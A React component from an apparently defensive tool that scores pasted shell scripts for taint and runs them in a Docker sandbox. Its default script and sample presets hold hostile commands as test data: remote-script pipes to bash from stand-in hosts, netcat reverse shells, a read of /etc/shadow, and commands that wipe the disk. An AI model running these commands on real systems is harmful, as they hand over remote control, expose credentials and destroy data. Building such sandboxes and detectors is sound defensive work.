import React, { useState } from 'react';
import {
  ShieldAlert,
  Cpu,
  Terminal,
  Play,
  RotateCcw,
  CheckCircle2,
  XCircle,
  AlertTriangle,
  FolderLock,
  Layers,
} from 'lucide-react';
import { analyzeTaint } from '../lib/taintTracker.ts';
import { EdgeSystemStatus, SandboxExecution } from '../lib/types.ts';

interface TaintSandboxViewProps {
  onExecuteSandbox: (scriptName: string, scriptContent: string) => Promise<SandboxExecution>;
  sandboxes: SandboxExecution[];
  status: EdgeSystemStatus;
}

export const TaintSandboxView: React.FC<TaintSandboxViewProps> = ({
  onExecuteSandbox,
  sandboxes,
  status,
}) => {
  const [scriptName, setScriptName] = useState('audit_target_script.sh');
  const [scriptContent, setScriptContent] = useState(`#!/bin/bash
# Script recebido de fonte externa para auditoria
echo "[INÍCIO] Verificando dependências do host..."
curl -sSL https://suspicious-cdn.xyz/installer.sh | bash
nc -e /bin/sh 192.168.1.100 4444
cat /etc/shadow
echo "[FIM] Processo concluído."`);

  const statusMessage = (st: SandboxExecution['status']) =>
    ({
      blocked_by_seccomp: 'AMEAÇA INTERCEPTADA: o kernel encerrou o processo por syscall não autorizada (seccomp). Host intocado.',
      denied_by_policy: 'EXECUÇÃO NEGADA: a política Zero-Trust barrou o script antes de iniciar. Nada foi executado.',
      sandbox_unavailable: 'SANDBOX INDISPONÍVEL: o Docker não está acessível, então o script NÃO foi executado.',
      timeout: 'TEMPO LIMITE: o container foi encerrado após exceder o tempo máximo.',
      failed: 'O script terminou com erro dentro do sandbox. Host intocado.',
    } as Record<string, string>)[st] ?? 'Execução concluída.';

  const [isRunning, setIsRunning] = useState(false);
  const [currentExecution, setCurrentExecution] = useState<SandboxExecution | null>(null);

  const taintAnalysis = analyzeTaint(scriptContent, 'file_upload');

  const handleLaunchMicroVM = async () => {
    setIsRunning(true);
    try {
      const exec = await onExecuteSandbox(scriptName, scriptContent);
      setCurrentExecution(exec);
    } finally {
      setIsRunning(false);
    }
  };

  const samplePayloads = [
    {
      label: 'Script Malicioso com Reverse Shell & Pipe',
      name: 'reverse_shell_drop.sh',
      content: `#!/bin/bash
# Tentativa de exfiltração e shell reverso
curl -sSL https://raw.evil.org/payload.sh | bash
nc -e /bin/bash 10.0.0.1 9001
rm -rf /tmp/logs/*`,
    },
    {
      label: 'Tentativa de Destruição de Raiz / Raw Disk',
      name: 'disk_destroy.sh',
      content: `#!/bin/sh
dd if=/dev/urandom of=/dev/sda bs=4M
rm -rf / --no-preserve-root`,
    },
    {
      label: 'Script Inofensivo de Diagnóstico Local',
      name: 'healthy_probe.sh',
      content: `#!/bin/bash
# Leitura estritamente passiva
uname -a
free -m
uptime`,
    },
  ];

  return (
    <div className="max-w-7xl mx-auto px-4 py-4 space-y-6">
      {/* Banner */}
      <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2">
            <span className="p-1.5 rounded bg-cyan-950 border border-cyan-600 text-cyan-400">
              <ShieldAlert className="w-5 h-5" />
            </span>
            <h2 className="text-base font-bold text-white">
              ISOLAMENTO DE AMEAÇAS &amp; TAINT TRACKING (MICROVMS EFÊMERAS)
            </h2>
          </div>
          <p className="text-xs text-slate-400 mt-1">
            Scripts suspeitos nunca rodam no host: vão para um container Docker descartável (rede desligada, FS somente-leitura, limites cgroup e seccomp). Scripts letais são negados antes de iniciar. Sem Docker, nada é executado.
          </p>
        </div>

        <div className="flex items-center gap-2 text-xs font-mono">
          <span className="px-3 py-1 rounded bg-slate-950 border border-slate-800 text-cyan-400">
            SECCOMP: {status.seccompStatus}
          </span>
          <span className="px-3 py-1 rounded bg-slate-950 border border-slate-800 text-emerald-400">
            CGROUPS: {status.cgroupsStatus}
          </span>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Script Editor & Taint Radar */}
        <div className="lg:col-span-6 space-y-4">
          <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 shadow-xl space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="text-sm font-bold text-slate-200 flex items-center gap-2">
                <FolderLock className="w-4 h-4 text-cyan-400" />
                Analisador de Carga Útil &amp; Scripts Externos
              </h3>
              <span className="text-[10px] font-mono text-slate-400">
                Taint Tracking em Tempo Real
              </span>
            </div>

            {/* Payload Presets */}
            <div>
              <div className="text-[11px] font-mono text-slate-400 mb-1">
                Carregar Amostra:
              </div>
              <div className="flex flex-wrap gap-1.5">
                {samplePayloads.map((spl, i) => (
                  <button
                    key={i}
                    onClick={() => {
                      setScriptName(spl.name);
                      setScriptContent(spl.content);
                      setCurrentExecution(null);
                    }}
                    className="px-2.5 py-1 rounded bg-slate-950 hover:bg-slate-800 text-slate-300 text-[11px] border border-slate-800 transition cursor-pointer"
                  >
                    {spl.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Script Name */}
            <div>
              <label className="block text-[11px] font-mono text-slate-400 mb-1">
                Nome do Arquivo / Artefato:
              </label>
              <input
                type="text"
                value={scriptName}
                onChange={(e) => setScriptName(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-1.5 text-slate-100 font-mono text-xs focus:outline-none focus:border-cyan-500"
              />
            </div>

            {/* Script Content */}
            <div>
              <label className="block text-[11px] font-mono text-slate-400 mb-1">
                Conteúdo do Script / Código:
              </label>
              <textarea
                rows={8}
                value={scriptContent}
                onChange={(e) => setScriptContent(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-slate-100 font-mono text-xs focus:outline-none focus:border-cyan-500"
              />
            </div>

            {/* Taint Evaluation Score Meter */}
            <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-slate-400">Nível de Contaminação (Taint):</span>
                <span
                  className={`px-2 py-0.5 rounded font-bold ${
                    taintAnalysis.level === 'CLEAN'
                      ? 'bg-emerald-950 text-emerald-400 border border-emerald-800'
                      : taintAnalysis.level === 'SUSPICIOUS'
                      ? 'bg-amber-950 text-amber-300 border border-amber-800'
                      : taintAnalysis.level === 'TAINTED_UNTRUSTED'
                      ? 'bg-rose-950 text-rose-300 border border-rose-800'
                      : 'bg-rose-950 text-rose-200 border border-rose-600 animate-pulse'
                  }`}
                >
                  {taintAnalysis.level} (Score: {taintAnalysis.score}/100)
                </span>
              </div>

              {/* Progress bar */}
              <div className="w-full bg-slate-900 rounded-full h-2 overflow-hidden">
                <div
                  className={`h-full transition-all duration-300 ${
                    taintAnalysis.score >= 70
                      ? 'bg-rose-500'
                      : taintAnalysis.score >= 40
                      ? 'bg-amber-500'
                      : taintAnalysis.score > 0
                      ? 'bg-cyan-500'
                      : 'bg-emerald-500'
                  }`}
                  style={{ width: `${Math.max(taintAnalysis.score, 5)}%` }}
                />
              </div>

              {/* Findings */}
              {taintAnalysis.findings.length > 0 && (
                <div className="pt-2 border-t border-slate-900 space-y-1">
                  <div className="text-[10px] font-mono text-slate-400">Assinaturas Detectadas:</div>
                  {taintAnalysis.findings.map((f, i) => (
                    <div key={i} className="text-[11px] text-rose-300 font-mono flex items-center gap-1.5">
                      <AlertTriangle className="w-3 h-3 text-rose-400 shrink-0" />
                      <span>{f}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <button
              onClick={handleLaunchMicroVM}
              disabled={isRunning}
              className="w-full py-2.5 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-slate-950 font-bold text-xs flex items-center justify-center gap-2 transition cursor-pointer disabled:opacity-50"
            >
              <Play className="w-4 h-4" />
              <span>{isRunning ? 'Executando no sandbox...' : 'Executar no Sandbox (Docker)'}</span>
            </button>
          </div>
        </div>

        {/* Right Column: MicroVM Execution Console & Historical Sandboxes */}
        <div className="lg:col-span-6 space-y-4">
          {/* MicroVM Execution Console */}
          <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 shadow-xl space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="text-sm font-bold text-slate-200 flex items-center gap-2">
                <Terminal className="w-4 h-4 text-emerald-400" />
                Console de Execução da MicroVM
              </h3>
              {currentExecution && (
                <span
                  className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${
                    currentExecution.status !== 'terminated_clean'
                      ? 'bg-rose-950 text-rose-300 border border-rose-800'
                      : 'bg-emerald-950 text-emerald-400 border border-emerald-800'
                  }`}
                >
                  {currentExecution.status}
                </span>
              )}
            </div>

            {currentExecution ? (
              <div className="space-y-3">
                {/* MicroVM Parameters Header */}
                <div className="p-2.5 rounded bg-slate-950 border border-slate-800 text-[11px] font-mono grid grid-cols-2 gap-2 text-slate-300">
                  <div>ID Sandbox: <span className="text-cyan-400">#{currentExecution.id}</span></div>
                  <div>Perfil Seccomp: <span className="text-emerald-400">{currentExecution.seccompProfile}</span></div>
                  <div>Limite CPU: <span className="text-amber-400">{currentExecution.cgroupCpuLimit}</span></div>
                  <div>Limite RAM: <span className="text-amber-400">{currentExecution.cgroupMemLimit}</span></div>
                </div>

                {/* MicroVM Stdout terminal */}
                <div className="p-3 rounded-lg bg-black/90 border border-slate-800 font-mono text-xs text-slate-300 max-h-64 overflow-y-auto space-y-1">
                  {currentExecution.stdout.map((line, idx) => (
                    <div
                      key={idx}
                      className={
                        line.includes('[KERNEL TRAP]') || line.includes('[KILL]')
                          ? 'text-rose-400 font-bold'
                          : line.includes('[CGROUPS]') || line.includes('[SECCOMP]')
                          ? 'text-cyan-300'
                          : line.includes('[SANDBOX INIT]')
                          ? 'text-amber-300'
                          : 'text-slate-300'
                      }
                    >
                      {line}
                    </div>
                  ))}
                </div>

                {/* Final status card */}
                <div
                  className={`p-3 rounded-lg border text-xs font-mono flex items-center gap-2 ${
                    currentExecution.status !== 'terminated_clean'
                      ? 'bg-rose-950/60 border-rose-800 text-rose-300'
                      : 'bg-emerald-950/60 border-emerald-800 text-emerald-300'
                  }`}
                >
                  {currentExecution.status !== 'terminated_clean' ? (
                    <>
                      <XCircle className="w-4 h-4 text-rose-400 shrink-0" />
                      <span>{statusMessage(currentExecution.status)}</span>
                    </>
                  ) : (
                    <>
                      <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                      <span>
                        EXECUÇÃO CONCLUÍDA EM ISOLAMENTO: Ambiente efêmero descartado sem persistência.
                      </span>
                    </>
                  )}
                </div>
              </div>
            ) : (
              <div className="p-8 text-center rounded-lg bg-slate-950/50 border border-dashed border-slate-800 text-xs text-slate-500 font-mono">
                Nenhuma execução ainda. Clique em "Executar no Sandbox" para analisar o script.
              </div>
            )}
          </div>

          {/* Past Sandboxes List */}
          {sandboxes.length > 0 && (
            <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 shadow-xl space-y-2">
              <h4 className="text-xs font-bold text-slate-300 font-mono uppercase tracking-wider">
                Execuções Recentes
              </h4>
              <div className="space-y-1.5 max-h-40 overflow-y-auto pr-1">
                {sandboxes.map((sb) => (
                  <div
                    key={sb.id}
                    onClick={() => setCurrentExecution(sb)}
                    className="p-2 rounded bg-slate-950 hover:bg-slate-800 border border-slate-800 flex items-center justify-between text-xs font-mono cursor-pointer transition"
                  >
                    <div className="flex items-center gap-2">
                      <span className="text-cyan-400">#{sb.id}</span>
                      <span className="text-slate-300 truncate max-w-xs">{sb.target}</span>
                    </div>
                    <span
                      className={`text-[10px] px-1.5 py-0.5 rounded font-bold ${
                        sb.status !== 'terminated_clean'
                          ? 'bg-rose-950 text-rose-300'
                          : 'bg-emerald-950 text-emerald-400'
                      }`}
                    >
                      {sb.status}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
